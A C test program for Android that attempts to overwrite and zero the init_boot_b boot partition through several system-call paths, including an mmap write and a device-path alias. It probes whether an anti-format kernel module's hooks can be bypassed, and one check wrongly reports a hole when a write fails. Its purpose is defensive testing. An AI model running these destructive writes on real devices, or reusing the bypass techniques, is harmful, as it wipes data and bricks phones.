/*
 * destroy_initboot.c - 极限破坏 init_boot_b 测试 (绕过 antiformat 模块所有 hook 面)
 *
 * 攻击手法矩阵:
 *   [A] open(O_WRONLY) + write()              -> hook_openat + hook_write
 *   [B] open(O_RDONLY) + ioctl(BLKZEROOUT)    -> 只读打开绕过 open, hook_ioctl
 *   [C] open(O_WRONLY|O_TRUNC)                -> hook_openat flags
 *   [D] open(O_WRONLY) + pwrite64()           -> hook_pwrite64
 *   [E] open(O_WRONLY) + fallocate()          -> hook_fallocate
 *   [F] open(O_WRONLY) + ftruncate()          -> hook_ftruncate
 *   [G] open(O_RDWR) + mmap() + 直接写映射    -> ★绕过所有 write hook (最隐蔽)
 *   [H] 用 /dev/block/bootdevice/by-name/ 别名 (字符串匹配绕过)
 *
 * 每个手法独立: 失败/被拦即继续下一个, 统计被拦数。
 * 成功(未被拦)即视为"模块有洞"!
 *
 * 编译: aarch64-linux-gnu-gcc -static -O2 -o destroy_initboot destroy_initboot.c
 * 用法: ./destroy_initboot [dev]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <linux/fs.h>

/* 张豪全防同款私有擦除命令族 (0x8018_0000 段) */
#define WIPE_CMD 0x80180040UL

static int blocked_all = 1; /* 全部被拦=1, 有洞=0 */

static void try_write_phase(const char *name, const char *dev)
{
	int fd, rc;
	char buf[4096];
	memset(buf, 0x5A, sizeof(buf)); /* 非零填充, 破坏更明显 */

	printf("\n[A] %s: open(O_WRONLY)+write\n", name);
	fd = open(dev, O_WRONLY);
	if (fd < 0) {
		printf("    open FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	printf("    open OK (fd=%d)\n", fd);
	rc = write(fd, buf, sizeof(buf));
	if (rc < 0) {
		printf("    write FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		blocked_all = 0;
	} else {
		printf("    write OK (%d bytes) -> ★有洞!!\n", rc);
		blocked_all = 0;
	}
	close(fd);
}

static void try_ioctl_zero(const char *name, const char *dev)
{
	int fd, rc;
	unsigned long long size = 0;

	printf("\n[B] %s: open(O_RDONLY)+ioctl(BLKZEROOUT)\n", name);
	fd = open(dev, O_RDONLY);
	if (fd < 0) {
		printf("    open FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	printf("    open(O_RDONLY) OK (fd=%d)\n", fd);
	ioctl(fd, BLKGETSIZE64, &size);
	printf("    size=%llu bytes\n", size);
	rc = ioctl(fd, BLKZEROOUT, &size);
	if (rc < 0) {
		printf("    BLKZEROOUT FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
	} else {
		printf("    BLKZEROOUT OK (%llu bytes zeroed) -> ★有洞!!\n", size);
		blocked_all = 0;
	}
	close(fd);
}

static void try_trunc(const char *name, const char *dev)
{
	int fd, rc;

	printf("\n[C] %s: open(O_WRONLY|O_TRUNC)\n", name);
	fd = open(dev, O_WRONLY | O_TRUNC);
	if (fd < 0) {
		printf("    open FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	printf("    open(O_TRUNC) OK (fd=%d) -> ★有洞!!\n", fd);
	blocked_all = 0;
	close(fd);
}

static void try_pwrite(const char *name, const char *dev)
{
	int fd, rc;
	char buf[4096];
	memset(buf, 0x6B, sizeof(buf));

	printf("\n[D] %s: open(O_WRONLY)+pwrite64\n", name);
	fd = open(dev, O_WRONLY);
	if (fd < 0) {
		printf("    open FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	rc = pwrite64(fd, buf, sizeof(buf), 0);
	if (rc < 0) {
		printf("    pwrite64 FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
	} else {
		printf("    pwrite64 OK (%d bytes) -> ★有洞!!\n", rc);
		blocked_all = 0;
	}
	close(fd);
}

static void try_fallocate(const char *name, const char *dev)
{
	int fd, rc;

	printf("\n[E] %s: open(O_WRONLY)+fallocate\n", name);
	fd = open(dev, O_WRONLY);
	if (fd < 0) {
		printf("    open FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	rc = fallocate(fd, 0, 0, 4096);
	if (rc < 0) {
		printf("    fallocate FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
	} else {
		printf("    fallocate OK -> ★有洞!!\n");
		blocked_all = 0;
	}
	close(fd);
}

static void try_ftruncate(const char *name, const char *dev)
{
	int fd, rc;

	printf("\n[F] %s: open(O_WRONLY)+ftruncate\n", name);
	fd = open(dev, O_WRONLY);
	if (fd < 0) {
		printf("    open FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	rc = ftruncate(fd, 4096);
	if (rc < 0) {
		printf("    ftruncate FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
	} else {
		printf("    ftruncate OK -> ★有洞!!\n");
		blocked_all = 0;
	}
	close(fd);
}

static void try_mmap(const char *name, const char *dev)
{
	int fd, rc;
	void *map;
	struct stat st;

	printf("\n[G] %s: open(O_RDWR)+mmap+直接写映射\n", name);
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("    open(O_RDWR) FAILED: %s (errno=%d) -> 拦截\n", strerror(errno), errno);
		return;
	}
	printf("    open(O_RDWR) OK (fd=%d)\n", fd);
	if (fstat(fd, &st) < 0) {
		printf("    fstat FAILED\n");
		close(fd);
		return;
	}
	/* mmap 整个设备 (block device 支持 mmap) */
	map = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (map == MAP_FAILED) {
		printf("    mmap FAILED: %s (errno=%d) -> 拦截(或设备不支持)\n", strerror(errno), errno);
		close(fd);
		return;
	}
	printf("    mmap OK @ %p\n", map);
	/* 直接写映射内存, 绕过所有 write 系统调用 hook! */
	memset(map, 0xCC, 4096);
	msync(map, 4096, MS_SYNC);
	printf("    mmap write OK -> ★有洞!! (绕过 write hook)\n");
	blocked_all = 0;
	munmap(map, 4096);
	close(fd);
}

int main(int argc, char **argv)
{
	const char *dev;
	const char *dev_alias;
	const char *dev_boot;

	if (argc >= 2) {
		dev = argv[1];
	} else {
		dev = "/dev/block/by-name/init_boot_b";
	}
	dev_boot = "/dev/block/bootdevice/by-name/init_boot_b";

	printf("==== destroy_initboot: 极限破坏测试 ====\n");
	printf("目标: %s\n", dev);

	/* 确认设备存在 */
	struct stat st;
	if (stat(dev, &st) < 0) {
		printf("设备不存在: %s\n", dev);
		return 2;
	}
	printf("dev_t = %u:%u\n", major(st.st_rdev), minor(st.st_rdev));

	/* A-F: 用主路径 */
	try_write_phase(dev, dev);
	try_ioctl_zero(dev, dev);
	try_trunc(dev, dev);
	try_pwrite(dev, dev);
	try_fallocate(dev, dev);
	try_ftruncate(dev, dev);
	try_mmap(dev, dev);

	/* H: 用 bootdevice 别名 (字符串绕过) */
	if (stat(dev_boot, &st) == 0) {
		printf("\n=== 别名攻击: %s ===\n", dev_boot);
		try_write_phase(dev_boot, dev_boot);
		try_ioctl_zero(dev_boot, dev_boot);
		try_mmap(dev_boot, dev_boot);
	} else {
		printf("\n[!] bootdevice 别名不存在, 跳过\n");
	}

	printf("\n==== 结果 ====\n");
	if (blocked_all)
		printf("全部被拦截: 防护无洞 ✅\n");
	else
		printf("有攻击未被拦截: 防护有洞 ✗ (恢复: dd if=/sdcard/aftest/init_boot_b.bak2 of=/dev/block/by-name/init_boot_b bs=1M)\n");
	return blocked_all ? 1 : 0;
}